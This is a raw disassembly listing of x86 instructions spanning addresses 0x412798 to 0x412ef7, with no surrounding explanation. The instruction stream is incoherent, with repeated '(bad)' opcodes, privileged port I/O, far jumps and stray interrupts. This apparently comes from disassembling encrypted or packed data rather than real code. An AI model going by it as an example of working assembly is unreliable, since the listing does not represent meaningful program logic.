  412798:	sub    eax,0xee52dda7
  41279d:	xor    dh,BYTE PTR [edi]
  41279f:	add    eax,DWORD PTR ds:[esi+0x3a]
  4127a3:	cmp    DWORD PTR [ebp+edi*8+0xd9f20f1],edx
  4127aa:	lods   eax,DWORD PTR ds:[esi]
  4127ab:	rcr    BYTE PTR [eax-0x6312043b],1
  4127b1:	mov    edi,0x1c0f3557
  4127b6:	pop    esi
  4127b7:	aad    0x3
  4127b9:	lea    esp,[edi+0x41]
  4127bc:	pop    ebx
  4127bd:	push   ss
  4127be:	in     eax,dx
  4127bf:	adc    eax,0x44b8f905
  4127c4:	jns    0x412758
  4127c6:	test   DWORD PTR [edx],ebp
  4127c8:	shr    DWORD PTR [ebx-0x873290d],cl
  4127ce:	xlat   BYTE PTR ds:[ebx]
  4127cf:	adc    ch,BYTE PTR [edx]
  4127d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127d2:	jg     0x4127d4
  4127d4:	aas    
  4127d5:	xchg   esi,eax
  4127d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d7:	mov    ebp,0x59046ea2
  4127dc:	test   ebx,ecx
  4127de:	xchg   ebx,eax
  4127df:	lods   al,BYTE PTR ds:[esi]
  4127e0:	push   esi
  4127e1:	xor    cl,BYTE PTR [ebp+0x5]
  4127e4:	popa   
  4127e5:	sub    esi,DWORD PTR [edx+0x1d201fcb]
  4127eb:	daa    
  4127ec:	mov    WORD PTR [edx],?
  4127ee:	inc    ebp
  4127ef:	inc    eax
  4127f0:	jns    0x412838
  4127f2:	jo     0x412817
  4127f4:	call   0x8825c5a0
  4127f9:	shl    DWORD PTR [edi+0x18],1
  4127fc:	xlat   BYTE PTR ds:[ebx]
  4127fd:	sti    
  4127fe:	mov    eax,ds:0xf0864e1a
  412803:	mov    ds:0x1887b530,eax
  412808:	outs   dx,DWORD PTR ds:[esi]
  412809:	stc    
  41280a:	xchg   esi,eax
  41280b:	xchg   ecx,esi
  41280d:	loop   0x41283e
  41280f:	imul   ebx,ecx,0x419158ab
  412815:	xor    BYTE PTR [ebx+eiz*4-0x62],ah
  412819:	shl    DWORD PTR [ecx+0x7f],0x3e
  41281d:	pushf  
  41281e:	and    BYTE PTR [eax],bl
  412820:	je     0x4127af
  412822:	jne    0x41284a
  412824:	loop   0x412844
  412826:	jb     0x412867
  412828:	cdq    
  412829:	aam    0x8d
  41282b:	lods   eax,DWORD PTR ds:[esi]
  41282c:	add    dl,BYTE PTR [edi+0x49]
  41282f:	rol    BYTE PTR [ebx-0x6e],cl
  412832:	test   bh,dh
  412834:	(bad)  
  412835:	jnp    0x4127bf
  412837:	pusha  
  412838:	push   0xc0d3b24c
  41283d:	fldcw  WORD PTR [esi-0x53]
  412840:	jmp    0x63d0:0xb1da5f79
  412847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412848:	call   0x4110:0x43abed5
  41284f:	ja     0x4127eb
  412851:	add    BYTE PTR [ebx+0x40],0xcb
  412855:	rcr    DWORD PTR [esi],cl
  412857:	and    DWORD PTR [edi+edx*8+0x40],eax
  41285b:	adc    DWORD PTR [ecx+esi*1],ebp
  41285e:	add    BYTE PTR [ecx+0x5583bf5f],ch
  412864:	jne    0x4127ea
  412866:	adc    DWORD PTR [ebx+0x3c],ebp
  412869:	in     eax,dx
  41286a:	or     al,0xdd
  41286c:	pop    edi
  41286d:	or     DWORD PTR [ecx],edx
  41286f:	mov    ds:0x24394833,eax
  412874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412875:	inc    esi
  412876:	fidiv  WORD PTR ds:0x5b3f18d3
  41287c:	dec    ebp
  41287d:	cmp    al,0x8c
  41287f:	(bad)  
  412880:	pop    ecx
  412881:	ror    esp,1
  412883:	mul    BYTE PTR ds:0xa95bb336
  412889:	fbstp  TBYTE PTR [esp+edx*1-0x5e8b697]
  412890:	pop    edx
  412891:	sbb    cl,BYTE PTR [edi]
  412893:	clc    
  412894:	cmp    eax,0x2bc1820d
  412899:	pop    ecx
  41289a:	aam    0x45
  41289c:	popa   
  41289d:	loope  0x4128b3
  41289f:	ins    DWORD PTR es:[edi],dx
  4128a0:	(bad)  
  4128a1:	shl    BYTE PTR [esi+0x7389dd99],1
  4128a7:	stc    
  4128a8:	pusha  
  4128a9:	int    0xf9
  4128ab:	lock and DWORD PTR [edx+ebx*1-0x46],edx
  4128b0:	fadd   DWORD PTR [eax+0x217f7cfc]
  4128b6:	imul   edx,DWORD PTR [edi],0x6f
  4128b9:	jnp    0x412921
  4128bb:	inc    esi
  4128bc:	mov    eax,0x73b825fb
  4128c1:	mov    eax,ds:0xe79c7f4f
  4128c6:	pop    eax
  4128c7:	lods   eax,DWORD PTR ds:[esi]
  4128c8:	(bad)  [ebp+eiz*2+0x42]
  4128cc:	cdq    
  4128cd:	call   0x387a76ce
  4128d2:	cmc    
  4128d3:	outs   dx,BYTE PTR ds:[esi]
  4128d4:	cmp    dh,BYTE PTR [ebx+ebp*1]
  4128d7:	mov    edi,0xf97ea06
  4128dc:	xchg   ebx,eax
  4128dd:	into   
  4128de:	dec    esi
  4128df:	int3   
  4128e0:	adc    DWORD PTR [ebx-0x34],ecx
  4128e3:	aam    0x50
  4128e5:	stos   BYTE PTR es:[edi],al
  4128e6:	into   
  4128e7:	stos   DWORD PTR es:[edi],eax
  4128e8:	sbb    DWORD PTR [ecx],edi
  4128ea:	repz mov ah,BYTE PTR [ebx+0x7e1c71b0]
  4128f1:	push   ecx
  4128f2:	and    al,0x2
  4128f4:	push   esi
  4128f5:	mov    WORD PTR [eax+0x33],fs
  4128f8:	inc    ebx
  4128f9:	mov    edi,DWORD PTR [ebp-0x62d3cef9]
  4128ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412900:	sti    
  412901:	arpl   WORD PTR [ecx-0x2c5d75eb],si
  412907:	ins    DWORD PTR es:[edi],dx
  412908:	xor    esp,esp
  41290a:	pusha  
  41290b:	or     BYTE PTR [edi+0x6f],0xb4
  41290f:	sbb    BYTE PTR [ecx+0xb],ah
  412912:	pop    ss
  412913:	int    0xa1
  412915:	test   eax,0xee72af44
  41291a:	push   ebp
  41291b:	push   edx
  41291c:	xor    al,0x16
  41291e:	fwait
  41291f:	xchg   ebp,eax
  412920:	sub    dl,BYTE PTR [ecx+0x21]
  412923:	xchg   edi,eax
  412924:	xchg   ebp,eax
  412925:	mov    bh,0x33
  412927:	jne    0x4128c4
  412929:	jb     0x412956
  41292b:	idiv   DWORD PTR [eax]
  41292d:	jg     0x412951
  41292f:	push   0x1e
  412931:	xchg   DWORD PTR [esp+ebp*1+0x6b],ecx
  412935:	fadd   QWORD PTR [ecx]
  412937:	lods   eax,DWORD PTR ds:[esi]
  412938:	cld    
  412939:	in     eax,dx
  41293a:	aam    0xb5
  41293c:	pop    esi
  41293d:	xor    dl,BYTE PTR [esi-0x49]
  412940:	jne    0x412954
  412942:	fbstp  TBYTE PTR [eax]
  412944:	adc    al,BYTE PTR [ebp-0x7f]
  412947:	xchg   DWORD PTR [edi-0x6a87387a],esp
  41294d:	xchg   edi,eax
  41294e:	(bad)  
  41294f:	mov    ch,0xf4
  412951:	mov    bh,0xfb
  412953:	jg     0x4129c2
  412955:	ds push ds
  412957:	scas   al,BYTE PTR es:[edi]
  412958:	xchg   esp,eax
  412959:	cmp    BYTE PTR [ecx+eiz*2-0x18],bl
  41295d:	sbb    ebx,DWORD PTR [ecx+ecx*4-0x6c]
  412961:	imul   ecx,eax,0x84336202
  412967:	leave  
  412968:	pop    eax
  412969:	hlt    
  41296a:	or     esp,DWORD PTR [ecx+0x170c4f23]
  412970:	sbb    BYTE PTR [ebx],dh
  412972:	cmp    eax,0xe3cf1ff
  412977:	pop    eax
  412978:	dec    ebp
  412979:	out    0xa7,al
  41297b:	jbe    0x412936
  41297d:	xchg   esp,eax
  41297e:	push   ebp
  41297f:	div    DWORD PTR ds:0xd1404a39
  412985:	pusha  
  412986:	mov    esp,0x329b6f33
  41298b:	xor    al,0x76
  41298d:	retf   
  41298e:	push   0xc47387a4
  412993:	(bad)  
  412994:	cmp    eax,0xcce2e450
  412999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41299a:	fs stc 
  41299c:	stos   DWORD PTR es:[edi],eax
  41299d:	call   0xa41be70c
  4129a2:	inc    ecx
  4129a3:	cli    
  4129a4:	and    bh,BYTE PTR [eax+0x24]
  4129a7:	sub    ebp,0x6023c4bc
  4129ad:	shr    BYTE PTR [edx-0x33],0x2d
  4129b1:	int3   
  4129b2:	pop    ebp
  4129b3:	sub    edi,edx
  4129b5:	add    al,0x59
  4129b7:	sub    bl,BYTE PTR [edx+ecx*4-0x324f1c97]
  4129be:	(bad)  
  4129bf:	retf   
  4129c0:	add    al,0x7c
  4129c2:	(bad)  
  4129c3:	mov    esp,0x5e78346d
  4129c8:	inc    eax
  4129c9:	icebp  
  4129ca:	jge    0x41296d
  4129cc:	scas   al,BYTE PTR es:[edi]
  4129cd:	inc    eax
  4129ce:	pop    edx
  4129cf:	xchg   ebp,eax
  4129d0:	scas   eax,DWORD PTR es:[edi]
  4129d1:	cmc    
  4129d2:	daa    
  4129d3:	aad    0x4a
  4129d5:	sar    DWORD PTR [esi],1
  4129d7:	aas    
  4129d8:	and    esp,DWORD PTR [ebx]
  4129da:	sbb    BYTE PTR [ebx+0x65],0xe3
  4129de:	test   al,0x8c
  4129e0:	jb     0x4129fb
  4129e2:	dec    edi
  4129e3:	push   edx
  4129e4:	retf   0x67ca
  4129e7:	das    
  4129e8:	sbb    eax,0xa1e53497
  4129ed:	mov    ch,0x83
  4129ef:	push   esi
  4129f0:	sub    al,0xf
  4129f2:	inc    esi
  4129f3:	popf   
  4129f4:	pop    esi
  4129f5:	push   edi
  4129f6:	jns    0x412a61
  4129f8:	pusha  
  4129f9:	dec    ebx
  4129fa:	inc    ecx
  4129fb:	mov    esi,0x60f775ed
  412a00:	push   0xf7cea1aa
  412a05:	and    BYTE PTR [ecx-0x24ec8ec0],0x18
  412a0c:	xchg   BYTE PTR [edi+0x18805a41],ch
  412a12:	stos   BYTE PTR es:[edi],al
  412a13:	clc    
  412a14:	data16 (bad) 
  412a16:	repz push es
  412a18:	shr    BYTE PTR [ebx+0x2b],0xa1
  412a1c:	lea    esi,[esi]
  412a1e:	inc    edx
  412a1f:	and    esp,0x101da05d
  412a25:	dec    eax
  412a26:	jmp    0x4539b1a2
  412a2b:	fbstp  TBYTE PTR [ecx+0x1a]
  412a2e:	jae    0x412a23
  412a30:	push   ecx
  412a31:	mov    al,ds:0x8922b514
  412a36:	loop   0x412a0c
  412a38:	in     al,dx
  412a39:	push   esp
  412a3a:	sub    eax,0x72db89a7
  412a3f:	dec    edi
  412a40:	push   es
  412a41:	out    dx,eax
  412a42:	icebp  
  412a43:	xor    BYTE PTR [ebp+0x72],0x93
  412a47:	mov    esp,0x2d4e5ba6
  412a4c:	jp     0x412a80
  412a4e:	jb     0x412aae
  412a50:	xchg   esp,eax
  412a51:	fwait
  412a52:	push   0x4434e39a
  412a57:	inc    edi
  412a58:	fs and al,0x38
  412a5b:	rcl    DWORD PTR [ecx],0x25
  412a5e:	xor    eax,0x66d832d2
  412a63:	arpl   WORD PTR [edi-0x171ca20],ax
  412a69:	inc    eax
  412a6a:	dec    eax
  412a6b:	xor    esi,eax
  412a6d:	ins    BYTE PTR es:[edi],dx
  412a6e:	pop    edi
  412a6f:	data16 int3 
  412a71:	ficom  DWORD PTR [ecx]
  412a73:	fwait
  412a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a75:	dec    eax
  412a76:	xchg   bl,bh
  412a78:	sub    eax,0x6e6fd8e9
  412a7d:	sbb    al,0xea
  412a7f:	outs   dx,DWORD PTR ds:[esi]
  412a80:	push   edx
  412a81:	dec    ebp
  412a82:	fidivr WORD PTR [ecx-0x11]
  412a85:	sub    eax,0x59bec548
  412a8a:	mov    ebx,0xb8a27c51
  412a8f:	push   esp
  412a90:	add    edx,ebp
  412a92:	pop    es
  412a93:	lock inc eax
  412a95:	push   edi
  412a96:	jb     0x412a35
  412a98:	add    esp,DWORD PTR ds:0xbb56f8bc
  412a9e:	mov    dh,0x91
  412aa0:	in     al,dx
  412aa1:	shl    DWORD PTR [esi-0x22ec9381],0x41
  412aa8:	aas    
  412aa9:	adc    ecx,DWORD PTR [ebx]
  412aab:	(bad)  
  412aac:	adc    al,0x56
  412aae:	cwde   
  412aaf:	daa    
  412ab0:	fld1   
  412ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab3:	xchg   ebx,eax
  412ab4:	mov    bh,0xe7
  412ab6:	mov    eax,0x687045f1
  412abb:	fdivp  st(3),st
  412abd:	jb     0x412b03
  412abf:	(bad)
  412ac2:	or     edi,edx
  412ac4:	in     al,dx
  412ac5:	push   eax
  412ac6:	adc    al,0xa2
  412ac8:	test   DWORD PTR [edx-0x1803d874],esp
  412ace:	xor    DWORD PTR [eax-0x523fe712],esp
  412ad4:	fld    TBYTE PTR [ebx+0x476ece0b]
  412ada:	pop    esp
  412adb:	adc    eax,DWORD PTR ds:0xde43ac12
  412ae1:	retf   0x8059
  412ae4:	push   edx
  412ae5:	sub    DWORD PTR [edi],ebx
  412ae7:	imul   ecx,DWORD PTR [edi],0x78
  412aea:	push   es
  412aeb:	adc    dh,BYTE PTR [ebx+0x6ee2dbe1]
  412af1:	icebp  
  412af2:	lock arpl WORD PTR [ecx+0x6e],dx
  412af6:	push   es
  412af7:	loop   0x412aad
  412af9:	shl    DWORD PTR [eax],cl
  412afb:	inc    eax
  412afc:	adc    BYTE PTR [ebx+edi*2-0x33],dh
  412b00:	rcl    DWORD PTR [ebp+esi*8-0x25acdfe9],0xbd
  412b08:	adc    eax,0x7464fa69
  412b0d:	fstp   QWORD PTR [ecx+0x29e48470]
  412b13:	adc    cl,dl
  412b15:	add    al,BYTE PTR [ebx+0x7fc984fb]
  412b1b:	adc    DWORD PTR [esi],ebp
  412b1d:	mov    ebx,0x46fdad0a
  412b22:	jmp    0x412b39
  412b24:	mov    esp,0xb42544b3
  412b29:	ret    
  412b2a:	loopne 0x412b48
  412b2c:	and    al,0x85
  412b2e:	cmp    ebp,esi
  412b30:	lock lds esp,FWORD PTR gs:[ebp+0x6bc75d88]
  412b38:	std    
  412b39:	jbe    0x412b87
  412b3b:	inc    ecx
  412b3c:	adc    DWORD PTR [edx+0x67f361af],0x9ede9e23
  412b46:	cs cmp eax,0x45d3d0d9
  412b4c:	push   ss
  412b4d:	sub    cl,BYTE PTR [ecx-0x6434c4a2]
  412b53:	jp     0x412b7a
  412b55:	es (bad) 
  412b57:	jmp    0x89289b07
  412b5c:	fwait
  412b5d:	out    dx,al
  412b5e:	sbb    edi,DWORD PTR [ecx+0x2c]
  412b61:	lock in eax,dx
  412b63:	mov    esi,0xeec72a8a
  412b68:	dec    ebp
  412b69:	jbe    0x412b77
  412b6b:	call   0xf1d5769a
  412b70:	lock cmc 
  412b72:	or     esi,DWORD PTR [eax+0x61]
  412b75:	cmp    eax,0x66f8860e
  412b7a:	mov    eax,ds:0xbbc9d2a4
  412b7f:	push   ecx
  412b80:	mov    ah,0xf5
  412b82:	mov    BYTE PTR [ecx+ebp*1-0x49438859],bh
  412b89:	add    BYTE PTR [edi+0x7c],dl
  412b8c:	stos   DWORD PTR es:[edi],eax
  412b8d:	lahf   
  412b8e:	push   edi
  412b8f:	xor    ecx,esi
  412b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b92:	fist   DWORD PTR [edi]
  412b94:	addr16 push ds
  412b96:	std    
  412b97:	aas    
  412b98:	ins    DWORD PTR es:[edi],dx
  412b99:	clc    
  412b9a:	mov    dh,0x84
  412b9c:	xlat   BYTE PTR ds:[ebx]
  412b9d:	and    DWORD PTR [edx],edx
  412b9f:	pusha  
  412ba0:	scas   al,BYTE PTR es:[edi]
  412ba1:	or     ch,BYTE PTR [eax]
  412ba3:	push   es
  412ba4:	xor    ch,BYTE PTR [edi-0x34]
  412ba7:	test   BYTE PTR [ecx+0x6],bl
  412baa:	pop    ebp
  412bab:	leave  
  412bac:	and    DWORD PTR [edi+0x61],edx
  412baf:	or     ebx,DWORD PTR [ebx]
  412bb1:	stos   BYTE PTR es:[edi],al
  412bb2:	pop    esp
  412bb3:	js     0x412c05
  412bb5:	iret   
  412bb6:	xor    esp,DWORD PTR [ecx-0x38]
  412bb9:	int    0xdb
  412bbb:	or     BYTE PTR [edi+0x98e2873],bl
  412bc1:	adc    al,0xa0
  412bc3:	repnz pop eax
  412bc5:	shl    BYTE PTR [esi+0x5],cl
  412bc8:	pop    ebp
  412bc9:	jns    0x412b62
  412bcb:	cmp    edx,DWORD PTR [ecx+0x37]
  412bce:	mov    esi,ecx
  412bd0:	in     eax,dx
  412bd1:	stos   BYTE PTR es:[edi],al
  412bd2:	xor    DWORD PTR [ebp-0x68],esi
  412bd5:	shl    BYTE PTR [ebx+0x61a29861],cl
  412bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdd:	aam    0xdf
  412bdf:	mov    ah,0xce
  412be1:	xchg   ebx,eax
  412be2:	adc    eax,0x98f65b9b
  412be7:	repnz or ch,BYTE PTR [edi]
  412bea:	shl    DWORD PTR [esi+0x275c5e5a],cl
  412bf0:	push   esi
  412bf1:	xchg   bh,cl
  412bf3:	cmp    bh,BYTE PTR [ebx+0xd]
  412bf6:	mov    dh,BYTE PTR [esi]
  412bf8:	leave  
  412bf9:	dec    bp
  412bfb:	jbe    0x412bc1
  412bfd:	inc    eax
  412bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bff:	cli    
  412c00:	dec    edi
  412c01:	arpl   WORD PTR [eax],si
  412c03:	lods   eax,DWORD PTR ds:[esi]
  412c04:	das    
  412c05:	sub    eax,0xe7ca523f
  412c0a:	sbb    ah,cl
  412c0c:	jae    0x412bb0
  412c0e:	add    eax,0x5ec4e85b
  412c13:	sahf   
  412c14:	mov    eax,ds:0x6ae2e753
  412c19:	test   eax,0x2b0cfd7d
  412c1e:	adc    DWORD PTR [edx],0x1a54de73
  412c24:	neg    DWORD PTR [esp+ebp*1]
  412c27:	jb     0x412bf2
  412c29:	imul   esp,DWORD PTR [edi],0x1390c6b3
  412c2f:	sbb    ah,0xe7
  412c32:	dec    ecx
  412c33:	adc    BYTE PTR [esi+edi*1+0x4c479d2],dh
  412c3a:	je     0x412c19
  412c3c:	in     al,0x99
  412c3e:	test   eax,0xcae4bde3
  412c43:	adc    BYTE PTR [edi+0x1c],bl
  412c46:	es scas eax,DWORD PTR es:[edi]
  412c48:	stos   DWORD PTR es:[edi],eax
  412c49:	xlat   BYTE PTR ds:[ebx]
  412c4a:	inc    edi
  412c4b:	sti    
  412c4c:	push   0x4c39269e
  412c51:	fimul  DWORD PTR [esi]
  412c53:	nop
  412c54:	lods   eax,DWORD PTR ds:[esi]
  412c55:	scas   eax,DWORD PTR es:[edi]
  412c56:	enter  0xf35a,0x47
  412c5a:	xchg   DWORD PTR [edi-0x29],esp
  412c5d:	xor    bh,ah
  412c5f:	mov    ecx,0x4f621f48
  412c64:	in     al,0x47
  412c66:	retf   0x798
  412c69:	mov    bh,0xb6
  412c6b:	and    eax,0x5b546b7e
  412c70:	xchg   edi,eax
  412c71:	or     DWORD PTR [esi+0x26f6a14a],eax
  412c77:	repnz dec ecx
  412c79:	cmp    bl,BYTE PTR [esi]
  412c7b:	loope  0x412c00
  412c7d:	cs call 0x9c45c322
  412c83:	mov    esp,0x29db75c4
  412c88:	sub    al,0x2f
  412c8a:	cli    
  412c8b:	stos   BYTE PTR es:[edi],al
  412c8c:	loop   0x412cf6
  412c8e:	push   ebx
  412c8f:	fisubr WORD PTR [eax+0x14]
  412c92:	sbb    eax,eax
  412c94:	test   al,0x33
  412c96:	iret   
  412c97:	mov    al,ds:0x917adb7f
  412c9c:	ss jg  0x412cd6
  412c9f:	fidiv  WORD PTR [ebx+eiz*4-0x49]
  412ca3:	inc    edi
  412ca4:	jne    0x412c46
  412ca6:	jmp    0x412cda
  412ca8:	add    DWORD PTR [ebx-0x11],edx
  412cab:	pop    es
  412cac:	mov    cl,0x5e
  412cae:	sbb    esp,DWORD PTR [edx+0x1c798ed1]
  412cb4:	loopne 0x412cc3
  412cb6:	xchg   esi,eax
  412cb7:	fwait
  412cb8:	sti    
  412cb9:	mov    eax,0x215cce9e
  412cbe:	push   0x13cc5d59
  412cc3:	jle    0x412c4a
  412cc5:	arpl   WORD PTR [ebx-0x503d2eb2],dx
  412ccb:	mov    esi,0x417e0fdd
  412cd0:	xor    eax,0xd693fcba
  412cd5:	ficomp DWORD PTR [esi-0x20]
  412cd8:	add    al,0xd3
  412cda:	cdq    
  412cdb:	sub    BYTE PTR [ebx],al
  412cdd:	test   BYTE PTR [esi-0x43],al
  412ce0:	stos   BYTE PTR es:[edi],al
  412ce1:	into   
  412ce2:	add    ebp,eax
  412ce4:	lods   eax,DWORD PTR ss:[esi]
  412ce6:	es jmp 0xbd68e28b
  412cec:	test   al,0x8b
  412cee:	pop    esi
  412cef:	(bad)  
  412cf0:	pushf  
  412cf1:	ss jno 0x412d1d
  412cf4:	mov    eax,ds:0xb79414ff
  412cf9:	rol    DWORD PTR [edi+eiz*2+0x3],1
  412cfd:	sti    
  412cfe:	je     0x412c98
  412d00:	out    0x22,eax
  412d02:	lods   eax,DWORD PTR ds:[esi]
  412d03:	adc    ch,BYTE PTR [esp+edi*2-0x6ada2596]
  412d0a:	push   esi
  412d0b:	(bad)  
  412d0c:	lock in eax,0x16
  412d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d10:	retf   0xd477
  412d13:	sbb    eax,0xab9a93a4
  412d18:	int    0x31
  412d1a:	ss dec edi
  412d1c:	scas   eax,DWORD PTR es:[edi]
  412d1d:	fcmovnu st,st(4)
  412d1f:	retf   0xe8cb
  412d22:	outs   dx,BYTE PTR ds:[esi]
  412d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d24:	mov    dh,0xe3
  412d26:	and    BYTE PTR [edx+0x45],cl
  412d29:	in     eax,dx
  412d2a:	xchg   ch,al
  412d2c:	test   DWORD PTR [ecx+edx*1+0x6aa39c90],esp
  412d33:	pop    ds
  412d34:	jne    0x412d76
  412d36:	ror    DWORD PTR [esi],cl
  412d38:	xor    edi,DWORD PTR [ebp-0x43b45a8f]
  412d3e:	push   esp
  412d3f:	ds stc 
  412d41:	cs mov esi,0xe9c8cbef
  412d47:	mov    fs,WORD PTR [ebx-0x24]
  412d4a:	mov    WORD PTR ss:[eax+eiz*1+0x7c],?
  412d4f:	sub    ch,0x2a
  412d52:	outs   dx,BYTE PTR ds:[esi]
  412d53:	sub    al,0x4a
  412d55:	rcr    DWORD PTR [edx+0x2a],cl
  412d58:	cmp    DWORD PTR [ebx-0x4d37b49],ebx
  412d5e:	inc    esi
  412d5f:	jb     0x412ce5
  412d61:	jecxz  0x412dd1
  412d63:	or     ebx,DWORD PTR ds:0x862c166d
  412d69:	cwde   
  412d6a:	sub    bl,dh
  412d6c:	popa   
  412d6d:	pop    ecx
  412d6e:	cs ds push eax
  412d71:	and    BYTE PTR [edx+0x36],dl
  412d74:	imul   DWORD PTR [ecx+0x12c30deb]
  412d7a:	aam    0x93
  412d7c:	add    DWORD PTR [edi],eax
  412d7e:	ret    
  412d7f:	loop   0x412d0e
  412d81:	mov    al,ds:0xe4fe0a8
  412d86:	push   eax
  412d87:	ficom  DWORD PTR [ecx-0x6b4d9a94]
  412d8d:	mov    cl,0x69
  412d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d90:	push   0xfffffff7
  412d92:	mov    ecx,0x51f29287
  412d97:	jl     0x412da1
  412d99:	dec    edx
  412d9a:	lods   eax,DWORD PTR ds:[esi]
  412d9b:	xor    al,0x3d
  412d9d:	aas    
  412d9e:	pop    eax
  412d9f:	idiv   ecx
  412da1:	push   ss
  412da2:	or     esi,DWORD PTR [edi+0x2d]
  412da5:	ret    0xf7c8
  412da8:	or     DWORD PTR [edx+ebx*4-0x55],0x4e35ac56
  412db0:	dec    ecx
  412db1:	retf   0x921b
  412db4:	call   DWORD PTR [ebx-0x41]
  412db7:	fld    QWORD PTR [eax]
  412db9:	out    dx,al
  412dba:	stos   BYTE PTR es:[edi],al
  412dbb:	and    eax,0x4a04d763
  412dc0:	aaa    
  412dc1:	mov    ds:0x4c7d177c,al
  412dc6:	fsub   QWORD PTR [edx-0x3d0c90d]
  412dcc:	out    dx,al
  412dcd:	jne    0x412e15
  412dcf:	ins    BYTE PTR es:[edi],dx
  412dd0:	addr16 or ecx,edx
  412dd3:	mov    BYTE PTR [edx-0x5a],dh
  412dd6:	dec    edi
  412dd7:	mov    al,ds:0xa831a1cb
  412ddc:	out    dx,eax
  412ddd:	mov    dh,0x53
  412ddf:	push   edi
  412de0:	rol    BYTE PTR [ecx-0x57],1
  412de3:	fisub  WORD PTR [edi+0x46839cea]
  412de9:	or     al,0x60
  412deb:	mov    eax,ds:0x672886c
  412df0:	(bad)  
  412df1:	bound  ecx,QWORD PTR [esi]
  412df3:	push   edx
  412df4:	pop    edi
  412df5:	(bad)  
  412df6:	int    0x17
  412df8:	shl    DWORD PTR [ebp+0x3],1
  412dfb:	cmp    esp,DWORD PTR [eax]
  412dfd:	pop    ebp
  412dfe:	xchg   DWORD PTR [edx-0x4d920dc1],edi
  412e04:	inc    esp
  412e05:	ins    DWORD PTR es:[edi],dx
  412e06:	push   ss
  412e07:	xor    esp,DWORD PTR [ebx+eax*8+0x1e]
  412e0b:	jge    0x412db2
  412e0d:	out    dx,al
  412e0e:	jmp    0x7595:0xc97a6ab1
  412e15:	jle    0x412e4a
  412e17:	lds    ecx,FWORD PTR [esi-0x1c]
  412e1a:	xchg   edx,eax
  412e1b:	aad    0xaf
  412e1d:	jp     0x412e3b
  412e1f:	pop    esp
  412e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e21:	jmp    0x412e03
  412e23:	adc    BYTE PTR [eax+0x7f9e8011],dl
  412e29:	and    al,BYTE PTR [edi-0x357380fd]
  412e2f:	and    edi,ebx
  412e31:	xchg   ebp,eax
  412e32:	jbe    0x412df8
  412e34:	gs cdq 
  412e36:	push   edx
  412e37:	shl    BYTE PTR [edi+0x75],0x92
  412e3b:	inc    ebx
  412e3c:	pop    ebp
  412e3d:	fs jns 0x412e33
  412e40:	mov    eax,0x1885fd6b
  412e45:	bound  edx,QWORD PTR [ecx-0x35]
  412e48:	dec    esi
  412e49:	sub    al,BYTE PTR [ebx+0x75ca3bb]
  412e4f:	ror    DWORD PTR [eax],0x65
  412e52:	jmp    0x412e07
  412e54:	sub    dh,BYTE PTR [edx+edi*1+0x4d]
  412e58:	xlat   BYTE PTR ds:[ebx]
  412e59:	xor    al,0x79
  412e5b:	and    cl,BYTE PTR [ebp+0x37]
  412e5e:	aad    0x93
  412e60:	mov    ds:0xd825f29f,al
  412e65:	lds    esi,FWORD PTR [esi+0x116d8578]
  412e6b:	lea    esi,[edi-0x67]
  412e6e:	push   ds
  412e6f:	mov    bl,ah
  412e71:	(bad)  
  412e72:	(bad)  
  412e73:	rol    BYTE PTR [edi],0x4b
  412e76:	mov    esp,0x1c91c607
  412e7b:	lods   al,BYTE PTR ds:[esi]
  412e7c:	cmp    esp,DWORD PTR [ebp-0x2b]
  412e7f:	sahf   
  412e80:	push   edx
  412e81:	dec    esp
  412e82:	addr16 mov al,0x84
  412e85:	aam    0x91
  412e87:	push   ss
  412e88:	dec    edx
  412e89:	push   es
  412e8a:	ror    bl,cl
  412e8c:	scas   al,BYTE PTR es:[edi]
  412e8d:	and    BYTE PTR [edi-0x79],al
  412e90:	inc    ebx
  412e91:	addr16 fwait
  412e93:	xchg   ebx,eax
  412e94:	pop    ecx
  412e95:	fstp   DWORD PTR [ecx]
  412e97:	add    esi,DWORD PTR [ecx-0xf37f756]
  412e9d:	pop    es
  412e9e:	mov    edx,0xa51da98b
  412ea3:	xchg   esp,eax
  412ea4:	das    
  412ea5:	push   esp
  412ea6:	cmp    eax,0xdf5b3cf3
  412eab:	sti    
  412eac:	mov    ds:0x9113257,al
  412eb1:	adc    cl,BYTE PTR [edi]
  412eb3:	jge    0x412e9a
  412eb5:	jo     0x412e5e
  412eb7:	sbb    DWORD PTR [ebp-0x2f],0xf466cdb5
  412ebe:	lods   al,BYTE PTR ds:[esi]
  412ebf:	pop    ecx
  412ec0:	test   eax,0x32795333
  412ec5:	sahf   
  412ec6:	icebp  
  412ec7:	shr    DWORD PTR [eax+0x5],0x54
  412ecb:	jmp    FWORD PTR [edx]
  412ecd:	(bad)  
  412ece:	outs   dx,DWORD PTR ds:[esi]
  412ecf:	out    0x4e,eax
  412ed1:	fidivr WORD PTR [esi]
  412ed3:	add    edx,DWORD PTR [eax]
  412ed5:	push   esp
  412ed6:	pop    esi
  412ed7:	outs   dx,DWORD PTR ds:[esi]
  412ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed9:	and    eax,edx
  412edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412edc:	aaa    
  412edd:	aaa    
  412ede:	enter  0x9268,0xf1
  412ee2:	sub    BYTE PTR [esi-0x6ff6a423],0xb0
  412ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eea:	mov    bh,0xd4
  412eec:	pop    esp
  412eed:	aas    
  412eee:	pusha  
  412eef:	sub    al,0xbf
  412ef1:	xor    eax,0xab3d564b
  412ef6:	push   es
  412ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
